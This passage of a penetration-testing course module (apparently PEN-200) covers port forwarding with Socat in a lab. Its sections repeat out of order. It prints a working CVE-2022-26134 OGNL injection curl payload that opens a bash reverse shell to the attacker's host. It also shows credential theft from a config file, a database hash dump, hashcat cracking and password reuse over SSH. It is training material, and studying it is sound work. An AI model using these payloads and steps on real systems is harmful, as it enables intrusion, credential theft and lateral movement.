curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

The verbose (**\-v**) **curl** request is being made to **http://10.0.0.28:8090**, which we assume is the blogpost author's vulnerable Confluence server. After this, the URL [_path_](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier#Syntax) looks more interesting. We observe that a lot of the characters in it are [_URL encoded_](https://en.wikipedia.org/wiki/Percent-encoding), so we need to _URL decode_ them to get a clearer sense of what the payload actually does.

You can quickly URL decode strings by selecting _Decode As..._ > _URL_ in the _Decoder_ tab in [_Burp_](https://portswigger.net/burp), or using an online tool such as [_CyberChef_](https://gchq.github.io/CyberChef/) If working with sensitive information in a real corporate environment, you should avoid pasting data into online tools. However, in this case we're decoding a proof-of-concept that's already public, so we can use online tools if necessary.

After URL decoding the path, the function of the payload is clearer.

```
/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
```

> Listing 2 - The example payload URL-decoded.

The URL path is an _OGNL injection_ payload. OGNL is [_Object-Graph Notation Language_](https://en.wikipedia.org/wiki/OGNL), an expression language commonly used in Java applications. OGNL injection can take place when an application handles user input in such a way that it gets passed to the OGNL expression parser. Since it's possible to execute Java code within OGNL expressions, OGNL injection can be used to execute arbitrary code.

The OGNL injection payload itself uses Java's [_ProcessBuilder_](https://docs.oracle.com/javase/7/docs/api/java/lang/ProcessBuilder.html) class to spawn a _Bash_ interactive reverse shell (_bash -i_).

This proof-of-concept payload is almost perfect for our needs. However, we need to modify it before we can use it. This is for two reasons. First, the Confluence server that the payload is pointing to in the original payload is not where our vulnerable Confluence server is. Second, the Bash reverse shell payload is pointing at port 1270 on 10.0.0.28, which is not where our Kali machine is. We need to modify these parameters in the payload before we can reuse it to exploit CONFLUENCE01 and return a shell to our own Kali machine.

While making these modifications, we also need to take the URL encoding into account. The payload string in the proof-of-concept isn't completely URL encoded. Certain characters (notably ".", "-" and "/") are not encoded. Although it's not always the case, for _this_ exploit, this turns out to be important to the functioning of the payload. If any of these characters are encoded, the server will parse the URL differently, and the payload may not execute. This means we can't apply URL encoding across the whole payload once we've modified it.

Keeping this in mind, we'll manually modify the parameters we need, using the original proof-of-concept payload as our base. We can change the Confluence server IP to **192.168.50.63**, and the Bash interactive shell payload IP and port to a listener we're going to open on our Kali machine (**/dev/tcp/192.168.118.4/4444**). We'll also remove the **curl** verbosity flag. This leaves us with the following modified payload:

```
curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 3 - The modified payload.

Now that our payload is customized for our use, we can start a [_Netcat_](https://en.wikipedia.org/wiki/Netcat) listener on our Kali machine on TCP port 4444.

```
kali@kali:~$ nc -nvlp 4444
listening on [any] 4444 ...
```

> Listing 4 - Starting Netcat listener on port 4444 on our Kali machine.

With our listener running, we'll open another shell on our Kali machine, then run the **curl** command we just constructed.

```
kali@kali:~$ curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.118.4/4444%200%3E%261%27%29.start%28%29%22%29%7D/

kali@kali:~$ 
```

> Listing 5 - Executing the modified reverse shell payload.

The command itself doesn't return anything, but the reverse shell is caught by our listener.

```
...
listening on [any] 4444 ...
connect to [192.168.118.4] from (UNKNOWN) [192.168.50.63] 55876
bash: cannot set terminal process group (813): Inappropriate ioctl for device
bash: no job control in this shell
confluence@confluence01:/opt/atlassian/confluence/bin$ id
id
uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
```

> Listing 6 - Bash reverse shell caught by our Netcat listener, and confirmed with the id command.

The **id** command confirms that this shell is running with the privileges of the _confluence_ user. This user has quite limited privileges. Regardless, we now have a reverse shell from CONFLUENCE01 to our Kali machine.

We can now start some light enumeration of CONFLUENCE01 using our new shell. We'll check the network interfaces using **ip addr**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:54:46 brd ff:ff:ff:ff:ff:ff
    inet 192.168.50.63/24 brd 192.168.50.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:5446/64 scope link 
       valid_lft forever preferred_lft forever
3: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
    link/ether 00:50:56:8a:c2:c9 brd ff:ff:ff:ff:ff:ff
    inet 10.4.50.63/24 brd 10.4.50.255 scope global ens224
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:fe8a:c2c9/64 scope link 
       valid_lft forever preferred_lft forever
```

> Listing 7 - Enumerating network interfaces on CONFLUENCE01.

The output shows us that CONFLUENCE01 has two network interfaces: _ens192_ and _ens224_. _ens192_ has the IP address 192.168.50.63, and _ens224_ has the IP address 10.4.50.63. We can then check the routes using **ip route**.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
ip route
default via 192.168.50.254 dev ens192 proto static 
10.4.50.0/24 dev ens224 proto kernel scope link src 10.4.50.63 
10.4.50.0/24 via 10.4.50.254 dev ens224 proto static
192.168.50.0/24 dev ens192 proto kernel scope link src 192.168.50.63
```

> Listing 8 - Enumerating routes on CONFLUENCE01.

The command shows us that we should be able to access hosts in the 192.168.50.0/24 subnet through the _ens192_ interface, and hosts in the 10.4.50.0/24 subnet through the _ens224_ interface.

Continuing our enumeration, we'll find the Confluence configuration file at **/var/atlassian/application-data/confluence/confluence.cfg.xml**. While reading the contents using **cat**, we discover some plaintext database credentials located within.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
<sian/application-data/confluence/confluence.cfg.xml   
<?xml version="1.0" encoding="UTF-8"?>

<confluence-configuration>
  <setupStep>complete</setupStep>
  <setupType>custom</setupType>
  <buildNumber>8703</buildNumber>
  <properties>
...
    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
    <property name="hibernate.connection.url">jdbc:postgresql://10.4.50.215:5432/confluence</property>
    <property name="hibernate.connection.username">postgres</property>
...
  </properties>
</confluence-configuration>
confluence@confluence01:/opt/atlassian/confluence/bin$ 
```

> Listing 9 - The credentials found in the Confluence confluence.cfg.xml file on CONFLUENCE01.

We'll find the IP address of the database server, as well as the plain text username and password used to connect to it. We can use these credentials to authenticate to the database and continue our enumeration.

We've hit a limitation, however. CONFLUENCE01 doesn't have a PostgreSQL client installed on it. Since we are running as the low-privileged _confluence_ user, we are also unable to easily install software.

We _do_ have the PostgreSQL client _psql_ installed on our Kali machine, but we can't connect directly to PGDATABASE01 from our Kali machine, since it's only routable from CONFLUENCE01.

In this scenario, there is no firewall in place between our Kali machine and CONFLUENCE01, meaning that there is nothing stopping us from binding ports on the WAN interface of CONFLUENCE01 and connecting to them from our Kali machine.

This is exactly the type of situation in which port forwarding can be useful. We can create a port forward on CONFLUENCE01 that listens on a port on the WAN interface, then forward all packets received on this port to the PGDATABASE01 on the internal subnet. In the next section, we will use [_Socat_](http://www.dest-unreach.org/socat/doc/socat.html) to achieve this.

## 19.2.3. Port Forwarding with Socat

Now we are ready to create a port forward. We have an idea of how we want it to work: CONFLUENCE01 should listen on a port on the WAN interface and forward all packets received on this port to the PGDATABASE01 on the internal subnet. This concept is illustrated in the following diagram:

![Figure 2: The way we expect our port forward to work](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/0821666b2826564e07661eba0550c37a-PRAT2_1_1_PortForwardPlan.png)

Figure 2: The way we expect our port forward to work

We want to open TCP port 2345 on the WAN interface of CONFLUENCE01, then connect to that port from our Kali machine. We want all the packets that we send to this port to be forwarded by CONFLUENCE01 to TCP port 5432 on PGDATABASE01. Once we set up our port forward, connecting to TCP port 2345 on CONFLUENCE01 will be exactly like connecting directly to TCP port 5432 on PGDATABASE01.

As part of our enumeration of CONFLUENCE01, we'll find Socat installed. Socat is a general-purpose networking tool that can set up a simple port forward in a single command.

In this scenario, we find it already installed, but Socat does not tend to be installed by default on \*NIX systems. If not already installed, it's possible to download and run a statically linked binary version instead.

We will use Socat to configure the desired port forward on CONFLUENCE01. It will listen on a port on the WAN interface (that our Kali machine can connect to) and forward packets received on that port to PGDATABASE01.

On CONFLUENCE01, we'll start a verbose (**\-ddd**) Socat process. It will listen on TCP port 2345 (**TCP-LISTEN:2345**), fork into a new subprocess when it receives a connection (**fork**) instead of dying after a single connection, then forward all traffic it receives to TCP port 5432 on PGDATABASE01 (**TCP:10.4.50.215:5432**).

We'll listen on port 2345 since it is outside the privileged port range (0-1024), meaning elevated privileges are not required.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432
<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.50.215:5432   
2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
2022/08/18 10:12:01 socat[46589] I starting accept loop
2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
```

> Listing 10 - Running the Socat port forward command.

The network is now set up like the following diagram:

![Figure 3: Socat in place as our port forwarder](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/eb1577c7ae460992abbeee4839ffb4e3-PRAT2_1_3_PortForwardSocat.png)

Figure 3: Socat in place as our port forwarder

With the Socat process running, we can run **psql** on our Kali machine, specifying that we want to connect to CONFLUENCE01 (**\-h 192.168.50.63**) on port 2345 (**\-p 2345**) with the _postgres_ user account (**\-U postgres**). When prompted, we will enter the password, and once connected, we can run the **\\l** command to list the available databases.

```
kali@kali:~$ psql -h 192.168.50.63 -p 2345 -U postgres
Password for user postgres: 
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

postgres=# \l
                                  List of databases
    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
------------+----------+----------+-------------+-------------+-----------------------
 confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
 template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
 template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
            |          |          |             |             | postgres=CTc/postgres
(4 rows)
```

> Listing 11 - Connecting to the PGDATABASE01 PostgreSQL service and listing databases using psql, through our port forward.

Success! We've connected to the PostgreSQL database through our port forward. We'll also find that we have access to the _confluence_ database.

Using our new database access, we can continue our enumeration. In the confluence database, let's query the _cwd\_user_ table. This contains the username and password hashes for all Confluence users. We'll connect to the database with the **\\c confluence** command, then run **select \* from cwd\_user;** to review everything in that table.

```
postgres=# \c confluence
psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
You are now connected to database "confluence" as user "postgres".

confluence=# select * from cwd_user;

   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
(6 rows)

(END)
```

> Listing 12 - The contents of the cwd\_user table in the confluence database.

We obtain multiple rows of user data. Each row contains data for a single Confluence user, including their password hash. We will use [_Hashcat_](https://hashcat.net/hashcat/) to try to crack these.

The [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) for _Atlassian (PBKDF2-HMAC-SHA1)_ hashes is _12001_, so we can pass that to the **\-m** mode flag. After copying the hashes into a file called **hashes.txt**, we'll pass this as the first positional argument. We can then pass the **fastrack.txt** password list that's built into Kali as the final positional argument.

```
kali@kali:~$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt 
hashcat (v6.2.5) starting

OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 11.1.0, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=====================================================================================================================================
* Device #1: pthread-11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz, 2917/5899 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

...

{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
...
```

> Listing 13 - Hashcat having cracked the database\_admin, hr\_admin and rdp\_admin account hashes.

It appears that the password policy for this Confluence instance isn't very strong. After only a few minutes of cracking, Hashcat returns passwords for the _database\_admin_, _hr\_admin_ and _rdp\_admin_ users.

We might suspect that these passwords are reused in other places throughout the network. After some more enumeration of the internal network, we'll find PGDATABASE01 is also running an SSH server. Let's try these credentials against this SSH server. With our new port forwarding skill, we can create a port forward on CONFLUENCE01 that will allow us to SSH directly from our Kali machine to PGDATABASE01.

First, we need to kill the original Socat process listening on TCP port 2345. We'll then create a new port forward with Socat that will listen on TCP port 2222 and forward to TCP port 22 on PGDATABASE01.

```
confluence@confluence01:/opt/atlassian/confluence/bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22
</bin$ socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22 

```

> Listing 14 - Creating a new port forward with Socat to access the SSH service on PGDATABASE01.

With our new Socat port forward set up, our network setup will be configured much like the following diagram:

![Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/ae6bb27852f848e8c26cbb2eb12443fb-PRAT2_1_4_PortForwardSocatSSH.png)

Figure 4: Using Socat to open a port forward from CONFLUENCE01 to the SSH server on PGDATABASE01

There are only very minimal differences between this and the previous network setup. Instead of listening on 2345, we are listening on 2222. Instead of forwarding to TCP port 5432 on PGDATABASE01, we are forwarding to TCP port 22 on PGDATABASE01.

We'll then use our SSH client to connect to port 2222 on CONFLUENCE01, as though we are connecting directly to port 22 on PGDATABASE01. We can use the _database\_admin_ user, and the password we just cracked using Hashcat.

```
kali@kali:~$ ssh database_admin@192.168.50.63 -p2222
The authenticity of host '[192.168.50.63]:2222 ([192.168.50.63]:2222)' can't be established.
ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.63]:2222' (ED25519) to the list of known hosts.
database_admin@192.168.50.63's password: 
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 18 Aug 2022 11:43:07 AM UTC

  System load:  0.1               Processes:               241
  Usage of /:   59.3% of 7.77GB   Users logged in:         1
  Memory usage: 16%               IPv4 address for ens192: 10.4.50.215
  Swap usage:   0%                IPv4 address for ens224: 172.16.50.215


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

database_admin@pgdatabase01:~$
```

> Listing 15 - Connecting to SSH server on PGDATABASE01, through the port forward on CONFLUENCE01.

Success! The **database\_admin** credentials have been reused here. We have managed to connect to the SSH server on PGDATABASE01 using the credentials for _database\_admin_ we found in the PostgreSQL database through the port forward we set up on CONFLUENCE01 with Socat.

In this Learning Unit, we created some simple port forwards using Socat. These allowed us to gain deeper access within a network by leveraging our existing access to a compromised host.

It should also be noted that Socat is not the only way to create port forwards on \*NIX hosts. There are several alternatives, of note:

-   [_rinetd_](https://github.com/samhocevar/rinetd) is an option that runs as a daemon. This makes it a better solution for longer-term port forwarding configurations but is slightly unwieldy for temporary port forwarding solutions.
    
-   We can combine Netcat and a [_FIFO_](https://man7.org/linux/man-pages/man7/fifo.7.html) named pipe file to create a [port forward](https://gist.github.com/holly/6d52dd9addd3e58b2fd5).
    
-   If we have root privileges, we could use iptables to create port forwards. The specific iptables port forwarding setup for a given host will likely depend on the configuration already in place. To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing "1" to **/proc/sys/net/ipv4/conf/\[interface\]/forwarding** (if it's not already configured to allow it).
    

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Port Redirection and SSH Tunneling - Port Forwarding with Socat - VM Group

#### Labs

1.  Follow the steps in this section to set up a port forward and gain access to the _confluence_ database on PGDATABASE01 using **psql** from your Kali machine. Crack the password of the _database\_admin_ user. What is the plain text password of this account?

Answer

# 19\. Port Redirection and SSH Tunneling

In this Learning Module, we will cover the following Learning Units:

-   Port Forwarding on \*NIX and Windows Machines
-   SSH Tunneling on (and between) \*NIX and Windows Machines

## 19.1. Why Port Redirection and Tunneling?

This Learning Unit covers the following Learning Objectives:

-   Understand the difference between common network layouts
-   Consider the impact of common network security devices
-   Understand when to use port redirection and tunneling techniques

Most network environments are not -and should not be- [_flat_](https://en.wikipedia.org/wiki/Flat_network), In a flat network, all devices are able to communicate freely with each other. There is little (or no) attempt to limit the access that each device has to other devices on the same network, regardless of whether devices need to communicate during normal operations.

Flat network topology is generally considered poor security practice. Once an attacker has access to a single host, they can start communicating with every other host. From there, it will be much easier to spread through the network and start compromising other hosts.

A more securely designed network type is [_segmented_](https://en.wikipedia.org/wiki/Network_segmentation).This type of network will be broken into smaller networks, each of which is called a [_subnet_](https://en.wikipedia.org/wiki/Subnetwork). Each subnet will contain a group of devices that have a specific purpose, and devices on that subnet are only granted access to other subnets and hosts when absolutely necessary. Network segmentation severely limits attackers, because compromising a single host no longer gives them free access to every other device on the network.

As part of the network segmentation process, most network administrators will also implement controls that limit the flow of traffic into, out from, and across their networks. To enforce this, they will deploy various technologies throughout the network.

One of the most common technologies used for this is [_Firewalls_](https://en.wikipedia.org/wiki/Firewall_(computing)). Firewalls can be implemented at the endpoint software level. For example, the _Linux kernel_ has firewall capabilities that can be configured with the [_iptables_](https://en.wikipedia.org/wiki/Iptables) tool suite, while Windows offers the built-in [_Windows Defender Firewall_](https://learn.microsoft.com/en-us/windows/security/threat-protection/windows-firewall/windows-firewall-with-advanced-security). Firewalls may also be implemented as features within a piece of physical network infrastructure. Administrators may even place a standalone _hardware firewall_ in the network, filtering all traffic.

Firewalls can drop unwanted inbound packets and prevent potentially malicious traffic from traversing or leaving the network. Firewalls may prevent all but a few allowed hosts from communicating with a port on a particularly privileged server. They can also block some hosts or subnets from accessing the wider _internet_.

Most firewalls tend to allow or block traffic in line with a set of rules based on _IP addresses_ and _port numbers_, so their functionality is limited. However, sometimes more fine-grained control is required. [_Deep Packet Inspection_](https://en.wikipedia.org/wiki/Deep_packet_inspection) monitors the contents of incoming and outgoing traffic and terminates it based on a set of rules.

Boundaries that are put in place by network administrators are designed to prevent the _arbitrary movement of data into, out of, and across the network_. But, as an attacker, these are exactly the boundaries we need to traverse. We'll need to develop strategies that can help us work around network restrictions as we find them.

_Port redirection_ (a term we are using to describe various types of [_port forwarding_](https://en.wikipedia.org/wiki/Port_forwarding)) and [_tunneling_](https://en.wikipedia.org/wiki/Tunneling_protocol) are both strategies we can use to traverse these boundaries. Port redirection modifies the data flow by redirecting packets from one socket to another. Tunneling means [_encapsulating_](https://en.wikipedia.org/wiki/Encapsulation_(networking)) one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

In this Module, we will introduce port redirection and tunneling techniques through practical examples. We'll ease in by starting with the lowest complexity techniques, and increase complexity as we move step-by-step towards more hardened network environments. Each new technique will be applied to a new network configuration that is slightly different than the previous. The only tunneling we cover in this Module is SSH tunneling, but we will cover more advanced methods in a later Module.

The [_logical topologies_](https://en.wikipedia.org/wiki/Network_topology) we create when chaining these strategies may initially be difficult to grasp. We will be making traffic move in ways that may not be initially intuitive. We should take the time to fully understand each technique before advancing to the next. By the end of this Module, we'll have all the tools required to manipulate the flow of traffic in any given network with surgical precision.

## 19.2. Port Forwarding with Linux Tools

This Learning Unit covers the following Learning Objectives:

1.  Understand what port forwarding is
2.  Learn when to use port forwarding techniques
3.  Use Socat to set up a port forward in Linux

Port forwarding is the most fundamental technique we will examine in this Module. It's also a technique that's very commonly used in general-purpose networking. When port forwarding, we configure a host to listen on one port and relay all packets received on that port to another destination.

In normal network conditions, a network administrator might create a port forward to allow access to a web server behind a firewall. In that case, they would configure the firewall to listen on a given port on one interface and pass all packets to the web server behind it.

Many home _routers_ also provide port forwarding functionality. These can be configured to listen on a port on the Internet-facing side of the router, then forward connections from that port to another device within the home network.

How might we use port forwarding in an attack chain? In the next section, we'll consider a simple scenario.

## 19.2.1. A Simple Port Forwarding Scenario

Let's examine a port forwarding scenario. During an assessment, we find a Linux web server running a version of [_Confluence_](https://www.atlassian.com/software/confluence) vulnerable to [_CVE-2022-26134_](https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html): a pre-authentication remote code execution issue. We can exploit this vulnerability and gain a reverse shell from the server.

During our enumeration, we find that this server has two _network interfaces_: one attached to the same network our Kali machine is also on (which allowed us to route to it directly), and another on an internal subnet. In the Confluence configuration file, we also find credentials and the IP address and port for a [_PostgreSQL_](https://www.postgresql.org/) database instance on a server in that internal subnet. We want to use these credentials to gain access to the database and enumerate further.

The following diagram illustrates our current understanding of the network layout.

![Figure 1: The network layout from our perspective so far](https://static.offsec.com/offsec-courses/PEN-200/imgs/prat2/9f1e3efdc5c0256e854e387e50f5a621-PRAT2_1_0_ConfluenceAndDatabaseNetworkSetup.png)

Figure 1: The network layout from our perspective so far

One of the first things to notice about this diagram is that there are two named networks: the [_Wide Area Network_](https://en.wikipedia.org/wiki/Wide_area_network) (WAN) on the left and the [_Demilitarized Zone_](https://en.wikipedia.org/wiki/DMZ_(computing)) (DMZ) on the right. Our Kali machine is in the WAN, the PostgreSQL database server PGDATABASE01 is in the DMZ, and the Confluence server CONFLUENCE01 straddles both.

A WAN is a network that is large and expansive. Some people refer to the public internet as the largest WAN in the world, and some larger organizations will refer to their large internal network as a WAN, or internal WAN. In this case, since we're simulating an attack from an external network, the WAN represents a large corporate internal network, or the internet itself.

In this module’s exercises, our Kali machine will be positioned in the WAN We can route directly from our Kali machine only to hosts also on the WAN.

A DMZ is a network containing devices that may be more exposed to a wider, less trusted network. A DMZ helps create a buffer zone between hosts on the wider, less trusted network and internal hosts. In this way, it serves a similar function to a real-world [_Demilitarized zone_](https://en.wikipedia.org/wiki/Demilitarized_zone). In this scenario, the DMZ is the buffer network segment between the WAN and whatever other internal networks we may find.

CONFLUENCE01 is straddling both the WAN and DMZ to illustrate that it can communicate on both networks. CONFLUENCE01 is also listening on TCP port 8090, illustrated by the "open socket" attached to the icon.

PGDATABASE01 is within the DMZ network boundary; it does not straddle the WAN/DMZ. Our Kali machine is not in the DMZ, so we can't directly route to PGDATABASE01. PGDATABASE01 also has an "open socket" attached to it, illustrating that there's something listening on TCP port 5432 (this is likely a PostgreSQL server, since the default port is 5432).

Since the only thing we know about PGDATABASE01 so far is that it exists, we don't yet know if it's attached to any other networks. If later we find that PGDATABASE01 is attached to other networks, we will expand our network diagram.

With the credentials we found on CONFLUENCE01, we want to try to connect to this PostgreSQL port on PGDATABASE01 from our Kali machine.

Before getting into more detail, let's set up our lab environment to recreate the scenario we've described so far.

At the end of the _Port Forwarding with Socat_ section of this Learning Unit, a group of VMs are provided that can be used to follow along with the following sections. These VMs are provided so you can gain hands-on experience with all the techniques we cover. You can start the VM group at any point and follow along at whatever pace feels comfortable.

## 19.2.2. Setting Up the Lab Environment

To gain access to CONFLUENCE01, we need to leverage the command execution vulnerability in the Confluence web application to get a reverse shell. After discovering that the Confluence web application is vulnerable to CVE-2022-26134, we'll find a blog post from [_Rapid7_](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) that includes a [_cURL_](https://curl.se/) command containing a [_proof-of-concept_](https://en.wikipedia.org/wiki/Proof_of_concept) payload that claims to exploit the vulnerability and return a reverse shell.

```
curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
```

> Listing 1 - The example payload from the Rapid7 blog post.

We don't run payloads without understanding exactly what they do, so we first need to figure out what's happening in this proof-of-concept.

